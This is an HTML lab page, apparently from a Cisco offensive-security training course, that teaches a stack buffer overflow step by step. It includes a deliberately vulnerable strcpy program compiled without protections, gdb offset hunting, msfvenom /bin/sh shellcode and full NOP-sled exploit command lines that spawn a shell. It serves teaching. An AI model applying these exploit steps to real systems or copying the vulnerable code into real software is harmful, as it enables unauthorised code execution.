<!DOCTYPE html>
<!-- saved from url=(0042)http://opflex.ciscolive.com/pod1/basics/os -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="cache-control" content="max-age=0">
            <meta http-equiv="cache-control" content="no-cache">
            <meta http-equiv="expires" content="0">
            <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
            <meta http-equiv="pragma" content="no-cache">
            <link href="./os_files/bootstrap.min.css" rel="stylesheet" media="screen">
            <link href="./os_files/github.css" rel="stylesheet">
            <link href="./os_files/cerulean.css" rel="stylesheet">
            <link href="./os_files/whitebackgroundmenu.css" rel="stylesheet">
            <link rel="stylesheet" href="./os_files/font-awesome.min.css">
            <link href="./os_files/style.css" rel="stylesheet">
            <link href="./os_files/cssterm.css" rel="stylesheet">
            <link href="./os_files/bootstrap-select.min.css" rel="stylesheet">
            <title>BAH Module 8</title>
             <meta name="author" content="Omar Santos">
</head>
<body>


	<div class="container">
		<nav class="navbar navbar-default navbar-fixed-top" id="ltraci-navbar" role="navigation">
		  <div class="container-fluid">
		    <!-- Brand and toggle get grouped for better mobile display -->
		    <div class="navbar-header">

			        <a href="index.html" class="navbar-brand"><div class="pn-noncollapse">Becoming a Hacker</div></a>

		      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
		        <span class="sr-only">Toggle navigation</span>
		        <span class="icon-bar navbar-inverse"></span>
		        <span class="icon-bar"></span>
		        <span class="icon-bar"></span>
		      </button>
		    </div>
		    <!-- Collect the nav links, forms, and other content for toggling -->
		    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
		      <ul class="nav navbar-nav">


		        <li class="dropdown">
		          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Menu<span class="caret"></span></a>
		          <ul class="dropdown-menu multi-column columns-3" role="menu" style="font-size:.7em;">
			          <div class="row">
				          <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 1</li>
										  <li>
                       <a href="#">No labs</a>
                      </li>
                    </ul>
				          </div>

                  <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 2</li>
										  <li>
                       <a href="module2.html">Passive Reconnissaince</a>
                      </li>
                    </ul>
				          </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 3</li>
                      <li>
                       <a href="module3.html">Active Reconnissaince</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 4</li>
                      <li>
                       <a href="module4.html">Networking</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 5</li>
                      <li>
                       <a href="module5.html">Wireless</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 6</li>
                      <li>
                       <a href="module6.html">Web Applications</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 7</li>
                      <li>
                       <a href="module7.html">Accounts and Passwords</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 8</li>
										  <li>
                       <a href="module8.html">Overflows</a>
                      </li>
                    </ul>
				          </div>


               </div>
               </ul>
               </li>



				<li class="ciscoliveitem"><a target="blank" href="resources.html">Resources</a></li>
				<li class="ciscoliveitem"><a target="blank" data-toggle="modal" data-target="#ABOUT" href="#">About</a></li>

		      </ul>

		    </div><!-- /.navbar-collapse  width="30px" -->
		  </div><!-- /.container-fluid -->
		</nav>
		</div>


    <div class="modal fade" id="ABOUT" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
            <h3 class="modal-title" id="myModalLabel">Becoming a Hacker Training</h3>
          </div>
          <div class="modal-body">
    		<div class="row">
                <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
                    <img src="./os_files/hacker.png" class="img-responsive">
                </div>
                <div class="col-lg-8 col-md-8 col-sm-6 col-xs-12">
                    <p>
                        The purpose of this lab is to provide the student a better understanding of offensive security.
                    </p>
                    <p>
                        Navigate to the <a href="resources.html"> Resources </a> page to obtain the presentations used in this class, as well as other resources on how to build your own lab.
                    </p>
                </div>
            </div>
            <div class="row">
              <p>

              </p>
            </div>
    		<div class="row" style="margin-top:20px;">
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Chris McCoy</strong><br>
                    Hacker, ASIG<br>
    				cmm@cisco.com<br>
    			</div>
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Everett Stiles</strong><br>
                    Hacker, ASIG<br>
    				estiles@cisco.com<br>
    			</div>
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Omar Ωr Santos</strong><br>
                    Peasant, PSIRT<br>
    				os@cisco.com<br>
    			</div>
    		</div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>

</div>

		<!-- <div class="container"> -->
			<!-- <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12"> -->



<div class="container">
<h1>Overflows</h1>

<h2>Tips:</h2>
<ul>
<li>Write scripts instead of typing the same long expression over and over again.</li>
<li>Keep notes of important addresses and values.</li>
<li>Remember, all we want to do is execute code we control.</li>
</ul>

<h2>Prerequisites:</h2>

Install 32-bit libraries:

<pre>
root@bah-pod1-kali:~/labs/overflows# dpkg --add-architecture i386
root@bah-pod1-kali:~/labs/overflows# apt update
...
root@bah-pod1-kali:~/labs/overflows# apt install g++-multilib libc6-dev-i386
...
</pre>

Disable ASLR on your current shell

<pre>
# cat /proc/self/maps | grep stack
7ffd1af83000-7ffd1afa4000 rw-p 00000000 00:00 0                          [stack]
# cat /proc/self/maps | grep stack
7ffedb900000-7ffedb921000 rw-p 00000000 00:00 0                          [stack]
# setarch i386 -R $SHELL
# cat /proc/self/maps | grep stack
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
# cat /proc/self/maps | grep stack
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
</pre>


<h2>Exercise 1 : Local shellcode execution on the stack </h2>

vuln1.c:
<pre>
#include<stdio.h>
#include<string.h>
int main(int argc, char **argv) {
        char mybuffer[512];
        strcpy(mybuffer,argv[1]);
        printf("You entered: %s\n", mybuffer);
}
</pre>

Build ./vuln1
<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Build the vulnerable binary</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 1 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button></div>
<div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
gcc -m32 -ggdb -fno-stack-protector -z execstack -o vuln1 vuln1.c
</pre>
</div></div>
<!-- end of copy /paste block -->

<hr>
<h3>Task 1</h3>

<p>Run <strong>gdb</strong> and debug <em><strong>/root/labs/overflows/vuln1</strong></em>. Make sure no environment variables are set.</p>

<pre>
env - gdb /root/labs/overflows/vuln1
(gdb) show env
LINES=29
COLUMNS=122
(gdb) unset env LINES
(gdb) unset env COLUMNS
</pre>

<hr>
<h3>Task 2</h3>
<p>Use <em>pattern_create.rb</em> to create a pattern. It takes one argument: a size. Make sure this size is larger than <em>mybuffer</em>.</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat1" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  (gdb) shell ./pattern_create.rb -l 600
  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<hr>
<h3>Task 3</h3>
<p> In gdb, run <em>vuln1</em> with the pattern created in task 2 as an argument. The program should segfault if the pattern is long enough.</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat2" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  (gdb) run $(./pattern_create.rb -l 600)
  Starting program: /home/seccon/labs/overflows/vuln1 $(./pattern_create.rb -l 600)
  You entered: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9

  Program received signal SIGSEGV, Segmentation fault.
  0x35724134 in ?? ()
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<hr>
<h3>Task 4</h3>
<p>Find the value in the register <em>eip</em>, then pass the value as an argument to 'pattern_offset.rb'.</p>

<pre>
  (gdb) info registers eip
  eip            0x35724134       0x35724134
  (gdb) p $eip
  $1 = (void (*)()) 0x35724134
  (gdb) shell ./pattern_offset.rb 35724134
  [*] Exact match at offset 524
</pre>

<p>You should now have the exact length (in bytes) from the start of <em>mybuffer</em> (somewhere between EBP and ESP) and the saved return address (Saved EIP).</p>

<img src="os_files/stack.png">

<hr>
<h3>Task 5</h3>
<p>Create a pattern of the length found in task 4 concatenated with the hex 0xCAFEF00D, and pass it as an argument to <em>vuln1</em>. This will place the hex 0xCAFEF00D into the saved return address. Verify by running <em>vuln1</em>, having it segfault, and printing the value of the register <em>eip</em>.</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint1" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
      <p>The architecture is <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a>.</p>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat3" href="#"> ++ Click here to Cheat with Python</a>
<div class="modal fade" id="Cheat3" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheating with Python</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>

(gdb) run $(python -c 'print "z"*524+"\x0d\xf0\xfe\xca"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/seccon/labs/overflows/vuln1 $(python -c 'print "z"*524+"\x0d\xf0\xfe\xca"')
You entered: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz...
Program received signal SIGSEGV, Segmentation fault.
0xcafef00d in ?? ()
(gdb) p $eip
$2 = (void (*)()) 0xcafef00d

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->
<hr>
<h3>Bonus Task:</h3>
Discover at what instruction the value of 0xCAFEF00D is loaded into the register EIP.

<hr>
<h3>Task 6</h3>
<p>Use <em><a href="https://sourceware.org/gdb/onlinedocs/gdb/Searching-Memory.html">gdb's find command</a></em> to locate the start of <em>mybuffer</em>.</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat4" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat4" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>

# 0x7a is the hex value for "z" (the value filling mybuffer)
# You should search for the values you put at the beginning of your buffer
(gdb) find /w1 $esp, +600, (int) 0x7a7a7a7a7a
0xbffffdb3
1 pattern found.
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->

<hr>
<h3>Task 7</h3>
<p>Replace 0xCAFEF00D from task 5 with the address found in task 6. This will cause the <em>eip</em> register to point to our buffer. Execution will now occur on the stack. When running, expect a SIGILL as a good sign, but a segfault could also occur.</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat5" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat5" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  (gdb) run $(python -c 'print "z"*524+"\xb3\xfd\xff\xbf"')
  The program being debugged has been started already.
  Start it from the beginning? (y or n) y

  Starting program: /home/seccon/labs/07-overflows/vuln1 $(python -c 'print "z"*524+"\xb3\xfd\xff\xbf"')
  You entered: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz...
  Program received signal SIGILL, Illegal instruction.
  0xbfffffc1 in ?? ()
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->

<hr>
<h3>Task 8</h3>
Now that we have execution, we are ready for shellcode. Construct a NOP sled (a sequence of 0x90) followed by a single 0xCC. 0xCC will stand in as our shell code for now. If you encounter a SIGTRAP then you were successful.

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint2" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<img src="os_files/nopsled.png"><br>
Remember the length found in task 4 and the address found in task 6.
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat6" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat6" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
(gdb) run $(python -c 'print "\x90"*523+"\xcc"+"\xb3\xfd\xff\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/seccon/labs/07-overflows/vuln1 $(python -c 'print "\x90"*523+"\xcc"+"\xb3\xfd\xff\xbf"')
You entered:...
Program received signal SIGTRAP, Trace/breakpoint trap.
0xbfffffbf in ?? ()
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->

<hr>
<h3>Task 9</h3>
<p>Generate shellcode that will execute<strong> <em>/bin/sh</em></strong> using <strong><em>msfvenom</em></strong>.</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint3" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint3" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
      msfvenom arguments
<pre>
payload: linux/x86/exec
options: CMD=/bin/sh
encoder: x86/shikata_ga_nai
avoid bytes: \x00\x0a\x0d
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat7" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat7" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  $ msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f python
  No platform was selected, choosing Msf::Module::Platform::Linux from the payload
  No Arch selected, selecting Arch: x86 from the payload
  Found 1 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 70 (iteration=0)
  buf =  ""
  buf += "\xbe\xcb\x7b\x4c\x0d\xdb\xdb\xd9\x74\x24\xf4\x5f\x2b"
  buf += "\xc9\xb1\x0b\x83\xef\xfc\x31\x77\x11\x03\x77\x11\xe2"
  buf += "\x3e\x11\x47\x55\x59\xb4\x31\x0d\x74\x5a\x37\x2a\xee"
  buf += "\xb3\x34\xdd\xee\xa3\x95\x7f\x87\x5d\x63\x9c\x05\x4a"
  buf += "\x7b\x63\xa9\x8a\x53\x01\xc0\xe4\x84\xb6\x7a\xf9\x8d"
  buf += "\x6b\xf3\x18\xfc\x0c"


  # Cleaning it up
  $ msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f python | grep 'buf +=' | sed -e 's/^.*"\(.*\)".*$/\1/' | tr -d '\n'
  No platform was selected, choosing Msf::Module::Platform::Linux from the payload
  No Arch selected, selecting Arch: x86 from the payload
  Found 1 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 70 (iteration=0)
  \xbd\xf1\x0a\xff\xdd\xda\xcc\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x0b\x31\x6e\x15\x83\xc6\x04\x03\x6e\x11\xe2\x04\x60\xf4\x85\x7f\x27\x6c\x5e\x52\xab\xf9\x79\xc4\x04\x89\xed\x14\x33\x42\x8c\x7d\xad\x15\xb3\x2f\xd9\x2e\x34\xcf\x19\x00\x56\xa6\x77\x71\xe5\x50\x88\xda\x5a\x29\x69\x29\xdc
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->

<hr>
<h3>Task 10</h3>
Repeat task 8 with the shellcode generated in task 9.

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat8" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat8" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
(gdb) run "$(python -c 'print "\x90"*(524-70)+"\xdb\xdc\xba\x0b\x45\x71\x2f\xd9\x74\x24\xf4\x5d\x2b\xc9" +"\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xfe\x2f" +"\x7a\x77\x99\xe2\x1a\xef\xb4\x61\x6a\x08\xae\x4a\x1f\xbf" +"\x2e\xfd\xf0\x5d\x47\x93\x87\x41\xc5\x83\x90\x85\xe9\x53" +"\x8e\xe7\x80\x3d\xff\x94\x3a\xc2\xa8\x09\x33\x23\x9b\x2e"+"\xb3\xfd\xff\xbf"')"
Starting program: /home/seccon/overflows/vuln1 "$(python -c 'print "\x90"*(524-70)+"\xdb\xdc\xba\x0b\x45\x71\x2f\xd9\x74\x24\xf4\x5d\x2b\xc9" +"\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xfe\x2f" +"\x7a\x77\x99\xe2\x1a\xef\xb4\x61\x6a\x08\xae\x4a\x1f\xbf" +"\x2e\xfd\xf0\x5d\x47\x93\x87\x41\xc5\x83\x90\x85\xe9\x53" +"\x8e\xe7\x80\x3d\xff\x94\x3a\xc2\xa8\x09\x33\x23\x9b\x2e"+"\xb3\xfd\xff\xbf"')"
You entered:...
process 5878 is executing new program: /bin/dash
$
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->

<hr>
<h3>Bonus</h3>
gdb is wonderful, but wouldn't it be nice to get the shellcode running outside the debugger?

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint4" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint4" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<img src="os_files/stacksize.png"> <br>
Values on the stack can affect the location of mybuffer. Environment variables and even the length of our program invocation need to be taken into consideration. We started gdb without environment variables and a fully qualified path /home/seccon/labs/overflows/vuln1; so, it would be a good idea to do the same outside of gdb. Even if the stack addresses are off by a little bit, the prepended NOP sled will give us some wiggle room. You may want to increase the return address if the program is segfaulting.
<pre>
env - /home/seccon/labs/overflows/vuln1
</pre>
</div>
</div>
<hr><br>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat9" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat9" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  seccon@(none):~/overflows$ env - /home/seccon/overflows/vuln1 "$(python -c 'print "\x90"*(524-70)+"\xdb\xdc\xba\x0b\x45\x71\x2f\xd9\x74\x24\xf4\x5d\x2b\xc9" +"\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xfe\x2f" +"\x7a\x77\x99\xe2\x1a\xef\xb4\x61\x6a\x08\xae\x4a\x1f\xbf" +"\x2e\xfd\xf0\x5d\x47\x93\x87\x41\xc5\x83\x90\x85\xe9\x53" +"\x8e\xe7\x80\x3d\xff\x94\x3a\xc2\xa8\x09\x33\x23\x9b\x2e"+"\xb3\xfd\xff\xbf"')"
  You entered:...
  Segmentation fault


  # Added 16 to Return Address "\xb3\xfd\xff\xbf" -> "\xc3\xfd\xff\xbf"
